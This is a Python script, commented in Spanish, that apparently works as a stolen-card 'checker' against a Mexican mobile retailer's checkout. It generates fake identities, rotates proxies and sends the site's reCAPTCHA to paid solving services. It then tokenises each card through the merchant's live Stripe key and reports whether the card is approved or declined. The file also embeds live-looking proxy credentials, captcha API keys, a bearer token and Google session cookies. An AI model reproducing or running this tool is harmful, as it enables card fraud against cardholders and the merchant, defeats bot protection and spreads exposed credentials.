import ast
import email
from email import message
from tarfile import data_filter
import random, time
import token
from faker import Faker
from random import choice
from tkinter import LAST, Tk, filedialog
from httpx import TooManyRedirects, request
import requests,re
from bs4 import BeautifulSoup as b
from bs4 import BeautifulSoup
#from hh import keep_alive
import requests
import json, string, re
import requests
import time
import json
import random, time
from faker import Faker
from random import choice
import asyncio
import requests
from bs4 import BeautifulSoup
import requests
import re
from bs4 import BeautifulSoup as b
from curl_cffi import requests
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import json
import cloudscraper


def usuario() -> dict:
    number = random.randint(1111, 9999)
    postal = random.choice(['10080', '14925', '71601', '86556', '19980'])
    return { 'name' : Faker().name(), 'email' : Faker().email().replace('@', '{}@'.format(number)), 'username' : Faker().user_name(), 'phone' : '512678{}'.format(number), 'city' : Faker().city(), 'code' : postal }


def capture(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]

    except ValueError:
        return None

def get_random_proxy(file_path="proxys.txt"):
    with open(file_path, "r") as f:
        proxies = f.readlines()
    
    proxy = random.choice(proxies).strip()  # Elegir un proxy aleatorio
    host_port, user_pass = proxy.split("@")  # Separar IP y usuario:contraseña
    host, port = host_port.split(":")  # Separar IP y puerto
    user, password = user_pass.split(":")  # Separar usuario y contraseña
    
    return host, port, user, password
async def resolver_captcha(api_key, sitekey, url):
    data = {
        'clientKey': api_key,
        'task': {
            'type': 'NoCaptchaTaskProxyless',
            'websiteURL': url,
            'websiteKey': sitekey
        }
    }
    try:
        response = await asyncio.to_thread(requests.post, 'http://api.anti-captcha.com/createTask', json=data)
        result = response.json()

        if 'errorId' in result and result['errorId'] == 0:
            task_id = result['taskId']
            
            # Esperar a que se resuelva el captcha
            while True:
                await asyncio.sleep(5)
                response = await asyncio.to_thread(requests.post, 'http://api.anti-captcha.com/getTaskResult', json={'clientKey': api_key, 'taskId': task_id})
                if response.json()['status'] == 'ready':
                    return response.json()['solution']['gRecaptchaResponse']
        else:
            raise Exception('Error en la API de anti-captcha')

    except Exception as e:
        raise Exception(f'Error al resolver el captcha: {str(e)}')
    
def generar_numero_usa():
    area_code = random.randint(200, 999)  # NXX (sin incluir 0 o 1 como primer dígito)
    central_office_code = random.randint(200, 999)  # NXX (sin incluir 0 o 1 como primer dígito)
    line_number = random.randint(1000, 9999)  # XXXX
    
    return f"({area_code})-{central_office_code}-{line_number}"

def print_all_texts(data):
    if isinstance(data, dict):
        # Si existe una clave 'value' que contiene una lista
        if "value" in data and isinstance(data["value"], list):
            for value_item in data["value"]:
                if isinstance(value_item, dict) and "text" in value_item:
                    print(value_item["text"])
        # Continuar buscando en otros niveles
        for key, value in data.items():
            print_all_texts(value)

    elif isinstance(data, list):
        for item in data:
            print_all_texts(item)


def ccn_gate(card):
    max_retries = 15
    retry_count = 0
    while retry_count < max_retries:
        try:
            #============[Funcions Need]============#
            c =  requests.Session()
            c.proxies = {'https': 'http://ubcff417d571a05cf-zone-custom-region-us-st-newyork-city-yonkers-session-OKEZNXIYE-sessTime-5:ubcff417d571a05cf@170.106.118.114:2334'}#the proxies?http://ubcff417d571a05cf-zone-custom-region-us-st-newyork-city-yonkers-session-OKEZNXIYE-sessTime-5:ubcff417d571a05cf@170.106.118.114:2334
            

            # Definir las credenciales del proxy y la URL
            proxy_url = 'http://proxy.soax.com:5000'
            proxy_user = 'package-265377-country-mx'
            proxy_pass = '589UEf1c4AXLjJ2M'

            # Configurar el proxy con autenticación
            #c.proxies = {
            #    'http': f'http://{proxy_user}:{proxy_pass}@proxy.soax.com:5000',
             #   'https': f'http://{proxy_user}:{proxy_pass}@proxy.soax.com:5000'
            #}

            # Desactivar la verificación SSL (equivalente al -k de curl)
            #c.verify = False

            # Permitir redirecciones (equivalente al -L de curl)
            #c.max_redirects = 10
            
            
            cc_number, mes, ano_number, cvv = card.split('|')
            if len(ano_number) == 2: ano_number = "20"+ano_number
            agente_user = UserAgent()
            proxy_host, proxy_port, proxy_user, proxy_pass = get_random_proxy()
            proxy = "geo.iproyal.com:12321"  # SIN "http://"
            proxy_auth = "rTPt8eauWJNOjdno:BUo3nBhOfK3TV3vt_country-us"

            proxys={"server": f"http://{proxy_host}:{proxy_port}"}

            #============[Address Found]============#
            name  = usuario()['name'].split(' ')[0]
            last  = usuario()['name'].split(' ')[1]
            email = usuario()['email']
            number = random.randint(1111, 9999)
            street = f"{name} street {number}"
            phone = usuario()['phone']
           

            #============[Requests 1]============#
            headers = {
                'authority': 'redphone.api.koonolmexico.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'origin': 'https://ecommerce.redphone.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://ecommerce.redphone.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            params = {
                'imei': '353495111910597',
                'sim_card_type': 'embedded',
            }

            response = c.get('https://redphone.api.koonolmexico.com/altan/imei_check', params=params, headers=headers)
            
            time.sleep(2)

            headers = {
                'authority': 'redphone.api.koonolmexico.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'authorization': 'Bearer eyJhbGciOiJIUzI1NiJ9.eyJhcGlfaWQiOiI2YTkzYjYxNC1lYzE4LTRlMDYtOWY4ZC1kZjhhYTY2NjllOWIifQ.ztwNlAv-V8L0M6qHfB68Q_cXupibSQCFTEguIf6XxTo',
                'cache-control': 'no-cache',
                'origin': 'https://ecommerce.redphone.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://ecommerce.redphone.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            params = {
                'bundle_id': '24',
            }

            response = c.get('https://redphone.api.koonolmexico.com/sim_cards/sim_cards', params=params, headers=headers)
            time.sleep(2)
            sufijo = ''.join(str(random.randint(0, 9)) for _ in range(3))

            headers = {
                'authority': 'redphone.api.koonolmexico.com',
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/json; charset=UTF-8',
                'origin': 'https://ecommerce.redphone.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://ecommerce.redphone.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            json_data = {
                'user': {
                    'signup_status': 'authorized',
                    'name': name,
                    'last_name': last,
                    'maiden_name': '',
                    'email': email,
                    'phone': None,
                    'mobile_phone': '9986326090',
                    'privacy_acceptance': True,
                },
            }

            response = c.post('https://redphone.api.koonolmexico.com/users', headers=headers, json=json_data)
            responsePm = json.loads(response.text)
            user_id = responsePm["user"]["id"]
            print(user_id)

            API_KEY = "bf5a65205366ac960191fd60de67463d"  # 🔴 Reemplázala con tu clave de Anti-Captcha
            SITE_KEY = "6LeRoVMUAAAAAGvv93qaFm8mOppFzZsq_FKIgHll"  # 🔹 Sitekey de reCAPTCHA
            URL_OBJETIVO = "https://ecommerce.redphone.com.mx/paso-3"  # 🔹 Página con el reCAPTCHA

            api_key = "faa4893569844da8b6055901f34b8d2f"

            # Datos del sitio
            website_url = "https://ecommerce.redphone.com.mx/paso-3"
            sitekey = "6LeRoVMUAAAAAGvv93qaFm8mOppFzZsq_FKIgHll"

            # Paso 1: Crear tarea en 2Captcha
            print("📤 Enviando captcha a 2Captcha...")

            payload = {
                'key': api_key,
                'method': 'userrecaptcha',
                'googlekey': sitekey,
                'pageurl': website_url,
                'json': 1
            }

            response = requests.post('http://2captcha.com/in.php', data=payload)
            task_result = response.json()

            if task_result['status'] != 1:
                print("❌ Error al enviar captcha:", task_result['request'])
                exit()

            captcha_id = task_result['request']
            print("🆔 Tarea creada. ID:", captcha_id)

            # Paso 2: Esperar la solución
            result_url = f"http://2captcha.com/res.php?key={api_key}&action=get&id={captcha_id}&json=1"
            print("⏳ Esperando respuesta...")

            token = None
            for _ in range(20):
                time.sleep(5)
                result_response = requests.get(result_url)
                result_data = result_response.json()

                if result_data['status'] == 1:
                    token = result_data['request']
                    print("✅ CAPTCHA resuelto.")
                    break
                elif result_data['request'] == 'CAPCHA_NOT_READY':
                    print("⏳ Aún sin resolver, esperando...")
                else:
                    print("❌ Error:", result_data['request'])
                    break

            else:
                return("❌ Tiempo de espera agotado.")
                
            print("pase aqui 1")
            headers = {
                'authority': 'www.google.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/x-protobuffer',
                # 'cookie': '__Secure-3PAPISID=RpxSH8Er4vu9_-vw/A7hRrCp8qg6w0Hp6l; __Secure-3PSID=g.a000wwgaJQGIFqZyyZ8fiYmGtaN-k0ywdqQhPz_9vwPsa4s_tw3Oc9XEjsQVK6NIa5l6YdgJ4wACgYKAZsSARYSFQHGX2MiKRq0RsOj3dPcqPHWgWk39RoVAUF8yKqEi0gbPnBaTpKE02yaXaV-0076; __Secure-3PSIDTS=sidts-CjIB5H03P9vV6DU_WK-kQggB0CAHNstHXw9AsE6P8_GuFAU4QtgjQmtoZAYawAMXgCi3FRAA; NID=524=vba3hYVbKOvNwH9UvWJRhbQNPLL96ytIUm_RkQwMC6KOvLc-yeZKX4etIlC7dinv4ePsCfwMlwFwm2tTcx4T6L5i-2n2XfdNW1yjqK0Y3Z86zekcTzjknRAoH-wO96tMs4MCnnUj8dnpeD88h6iQuK8hWvQCo3YzASgU6hc7LoNzYC_F-I6MNN52jifnQprShSDIGTtHXAx-gy5FIlzcYTOQKfwLBRUA_jrMOCOZtmd7eClK31JxT-y2NAzIrlffhJ90wMxMaAqrnglyelKBNEyqCXsyA9fAZyOeAYlUbtmBiJKCPR9pitoO3I7YJthy8GAyx7xYVPTfdceA2cyU7-4yMFv22hf7f6hAzTNuYtNz5khPSLw5VX9gLfcp3gA1wDv4udlJgRPpXLW6f8Vkpk2JOUqP3CKld2yeUMdDq5tF48qLhIRUozmkKtHa2idmAzW0iHxhe0uvFyAF0LAPg1Emb0cJjYr1h-PzBCUcuDJFzFx6otIFvzrVclwv2fTYA-Iry1ecCvhaL2d2NbFKGn51UL37S56-c6NwduMNYI-LA0FJQInTYVYhO_t9L3cQHQ3dCvjIpeg3Mdf-GfdVeJrJx1STgQES2yJSrNapnh1-j_fIGsphbWbK71J8cgtTyYT8Bf48LbV4LpwYwZevhFrZIdGtnaFsjz5nqoDDWJ0F17uqIVVTZ-gu5CVXZUB7vGcVQI8eufd3KyF-PHWil2mf85ihCna8b8wr641Gaqjg0B0-OE6ILe9xVqBSGOR2HKK2-IpxaqIvTZBvX0mPdqSmURV5ntgv82mxcHAGmij279QRptHiXrrPLwVxYuhF0hAbzyHhIM5MMEiN-WYjg1PPH7WhhmkgHBLoDesIDgM4qDiHvx007SUTTuxq8KKXE8sMLgquZgcPjRFHQAPgpd8LTzDj6t6M62ui3xw3dl3Ams67LciRSrEv-Z7mBTm8TNcfWQoN5m163MA-Lll1gseZ9lEIVxGHE8vJwPoJY53QPG4c0hSxgrZaEISVfi9-jVueR3OAc-NwosXAvZXJPBcDADlwmcfwjbx5PL5jxK_fzonCM9BHsXgPAdBthyD2eC3g53vMRQGs_aGWjdFsVI7RdAojzPngfU87lJM1bi8D1A6ytoPmPh1E_T_8mMDbXS9FR08Od4F5j5-v26An2iUutam9i2pg_BIxjw7tMTckYxmJCHdRg7t-A0DQTxCBeGtguAKITwrKchVDu8dTuaGvmwjgqRyLC4UT9BUkZ1mJOCHkCxoXWyHlukzBqDiphi6YzXvAJzBtiGeqQ74YwqUYfzogRi64qtJJVVUHERaYw9PIKayTgnwdUQHiHqQLpB1f-fpfOc2-ufG5d1GgC7wVJHcIGE-94zwP3JEJnTAFG6NrTFIPYJJAUyMbUm5pdxNNI8FDa41Ptp-DjO1qrFFsyt_uJcRWwIDLMQ; __Secure-3PSIDCC=AKEyXzUcz7FlEOTMpOMhQKkFs86fUHKlDmN3yXOk1nnW60AjJ5vP-0L7vquPX_GzauMkcienG3M',
                'origin': 'https://www.google.com',
                'pragma': 'no-cache',
                'referer': 'https://www.google.com/recaptcha/api2/bframe?hl=es&v=GUGrl5YkSwqiWrzO3ShIKDlu&k=6LeRoVMUAAAAAGvv93qaFm8mOppFzZsq_FKIgHll',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                'x-client-data': 'CLuIywE=',
            }

            params = {
                'k': '6LeRoVMUAAAAAGvv93qaFm8mOppFzZsq_FKIgHll',
            }

            data = b'\n\x18GUGrl5YkSwqiWrzO3ShIKDlu\x12\xc3\xa4\x0b' + token.encode('utf-8')

            response = c.post('https://www.google.com/recaptcha/api2/reload', params=params,  headers=headers, data=data)
            print("pase aqui 2")

            headers = {
                'authority': 'www.google.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                # 'cookie': '__Secure-3PAPISID=RpxSH8Er4vu9_-vw/A7hRrCp8qg6w0Hp6l; __Secure-3PSID=g.a000wwgaJQGIFqZyyZ8fiYmGtaN-k0ywdqQhPz_9vwPsa4s_tw3Oc9XEjsQVK6NIa5l6YdgJ4wACgYKAZsSARYSFQHGX2MiKRq0RsOj3dPcqPHWgWk39RoVAUF8yKqEi0gbPnBaTpKE02yaXaV-0076; __Secure-3PSIDTS=sidts-CjIB5H03P9vV6DU_WK-kQggB0CAHNstHXw9AsE6P8_GuFAU4QtgjQmtoZAYawAMXgCi3FRAA; NID=524=vba3hYVbKOvNwH9UvWJRhbQNPLL96ytIUm_RkQwMC6KOvLc-yeZKX4etIlC7dinv4ePsCfwMlwFwm2tTcx4T6L5i-2n2XfdNW1yjqK0Y3Z86zekcTzjknRAoH-wO96tMs4MCnnUj8dnpeD88h6iQuK8hWvQCo3YzASgU6hc7LoNzYC_F-I6MNN52jifnQprShSDIGTtHXAx-gy5FIlzcYTOQKfwLBRUA_jrMOCOZtmd7eClK31JxT-y2NAzIrlffhJ90wMxMaAqrnglyelKBNEyqCXsyA9fAZyOeAYlUbtmBiJKCPR9pitoO3I7YJthy8GAyx7xYVPTfdceA2cyU7-4yMFv22hf7f6hAzTNuYtNz5khPSLw5VX9gLfcp3gA1wDv4udlJgRPpXLW6f8Vkpk2JOUqP3CKld2yeUMdDq5tF48qLhIRUozmkKtHa2idmAzW0iHxhe0uvFyAF0LAPg1Emb0cJjYr1h-PzBCUcuDJFzFx6otIFvzrVclwv2fTYA-Iry1ecCvhaL2d2NbFKGn51UL37S56-c6NwduMNYI-LA0FJQInTYVYhO_t9L3cQHQ3dCvjIpeg3Mdf-GfdVeJrJx1STgQES2yJSrNapnh1-j_fIGsphbWbK71J8cgtTyYT8Bf48LbV4LpwYwZevhFrZIdGtnaFsjz5nqoDDWJ0F17uqIVVTZ-gu5CVXZUB7vGcVQI8eufd3KyF-PHWil2mf85ihCna8b8wr641Gaqjg0B0-OE6ILe9xVqBSGOR2HKK2-IpxaqIvTZBvX0mPdqSmURV5ntgv82mxcHAGmij279QRptHiXrrPLwVxYuhF0hAbzyHhIM5MMEiN-WYjg1PPH7WhhmkgHBLoDesIDgM4qDiHvx007SUTTuxq8KKXE8sMLgquZgcPjRFHQAPgpd8LTzDj6t6M62ui3xw3dl3Ams67LciRSrEv-Z7mBTm8TNcfWQoN5m163MA-Lll1gseZ9lEIVxGHE8vJwPoJY53QPG4c0hSxgrZaEISVfi9-jVueR3OAc-NwosXAvZXJPBcDADlwmcfwjbx5PL5jxK_fzonCM9BHsXgPAdBthyD2eC3g53vMRQGs_aGWjdFsVI7RdAojzPngfU87lJM1bi8D1A6ytoPmPh1E_T_8mMDbXS9FR08Od4F5j5-v26An2iUutam9i2pg_BIxjw7tMTckYxmJCHdRg7t-A0DQTxCBeGtguAKITwrKchVDu8dTuaGvmwjgqRyLC4UT9BUkZ1mJOCHkCxoXWyHlukzBqDiphi6YzXvAJzBtiGeqQ74YwqUYfzogRi64qtJJVVUHERaYw9PIKayTgnwdUQHiHqQLpB1f-fpfOc2-ufG5d1GgC7wVJHcIGE-94zwP3JEJnTAFG6NrTFIPYJJAUyMbUm5pdxNNI8FDa41Ptp-DjO1qrFFsyt_uJcRWwIDLMQ; __Secure-3PSIDCC=AKEyXzVlA924o2D1DWcmAgyuu7cqiM7mgC2cLHf8j2dOz1F9UIYt37lgOhvdzxw-UGm1YVZCCeA',
                'origin': 'https://www.google.com',
                'pragma': 'no-cache',
                'referer': 'https://www.google.com/recaptcha/api2/bframe?hl=es&v=GUGrl5YkSwqiWrzO3ShIKDlu&k=6LeRoVMUAAAAAGvv93qaFm8mOppFzZsq_FKIgHll',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                'x-client-data': 'CLuIywE=',
            }

            params = {
                'k': '6LeRoVMUAAAAAGvv93qaFm8mOppFzZsq_FKIgHll',
            }

            data = f'v=GUGrl5YkSwqiWrzO3ShIKDlu&c={token}'
            print("pase aqui 3")

            response = c.post(
                'https://www.google.com/recaptcha/api2/userverify',
                params=params,
               
                headers=headers,
                data=data,
            )

            headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'accept-language': 'en-US',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'pragma': 'no-cache',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            data = (
                'time_on_page=45967'
                '&pasted_fields=number'
                '&guid=2953e2d9-6a1c-4c42-a83e-28bb4e237f8577fee5'
                '&muid=830cfac5-04bc-45bf-b039-3d4790e48dfa5b7899'
                '&sid=49eb8764-fc5a-4378-aae7-1bf269668301f5b6cf'
                '&key=pk_live_51KOX42AMlS3RZFNSs08ALhGLqQIZ8hZLlEkBxYlxQo6aJlEcz442oQ7L9Eejs7niMHf6PKYGofk0jIMB78ubKt6D00qp0QZjLC'
                '&payment_user_agent=stripe.js%2F78ef418'
                f'&card[number]={cc_number}'
                f'&card[cvc]={cvv}'
                f'&card[exp_month]={mes}'
                f'&card[exp_year]={ano_number}'
            )
            print("pase aqui 4")

            response = c.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
            responsePm = json.loads(response.text)
            print(response)
            if "id" in responsePm:
                tokenst = responsePm["id"]
                print(tokenst)
            else:
                return "❌ Usa otra tarjeta o comando"

            headers = {
                'authority': 'redphone.api.koonolmexico.com',
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/json; charset=UTF-8',
                'origin': 'https://ecommerce.redphone.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://ecommerce.redphone.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            json_data = {
                'payment_card': {
                    'openpay_token': None,
                    'openpay_device_session_id': 'muIlmGIxdJlmRLS05xGvR9ldhtWBSbOm',
                    'stripe_token': tokenst,
                    'is_default': True,
                    'payment_method': 'card',
                    'identification_number': None,
                    'mercado_pago_token': None,
                },
                'user_id': user_id,
            }

            response = c.post('https://redphone.api.koonolmexico.com/payment_cards', headers=headers, json=json_data)
            time.sleep(2)
            responsePm = json.loads(response.text)
            print(responsePm)
            

            mensaje = ""

            # Verificar si hay un error tipo 'card_declined'
            if 'message' in responsePm and 'error' in responsePm['message']:
                error_info = responsePm['message']['error']
                if error_info.get('code') == 'card_declined':
                    mensaje = f"❌ Tarjeta rechazada: {error_info.get('message', 'Error desconocido')}"
                else:
                    mensaje = f"⚠️ Otro error: {error_info.get('message', 'Error desconocido')}"

            # Verificar si está aprobado por status 'delivered' o 'authorized'
            elif 'altan_service_bundle_order' in responsePm:
                status = responsePm['altan_service_bundle_order'].get('status', '').lower()
                if status in ['delivered', 'authorized']:
                    mensaje = "✅ Aprobado"
                else:
                    mensaje = f"🔄 Estado: {status}"

            # Verificar si existe 'created_at' en payment_card
            elif 'payment_card' in responsePm and 'created_at' in responsePm['payment_card']:
                fecha = responsePm['payment_card']['created_at']
                mensaje = f"✅ Aprobado (Tarjeta registrada correctamente)\n🕒 Fecha de creación: {fecha}"

            # En caso de que no sea ninguno de los anteriores
            else:
                mensaje = f"❓ Respuesta no reconocida: {responsePm}"
            
            print(mensaje)

            return mensaje

            

            
                                    
            


            
           

          

                    
           
            

        
            
        except Exception as e:
            print(e)
            retry_count += 1
    else:
        return {"card": card, "status": "ERROR", "resp":  f"Retries: {retry_count}"}
    

if __name__ == "__main__":
    print(ccn_gate("5579100382006417|01|2028|393"))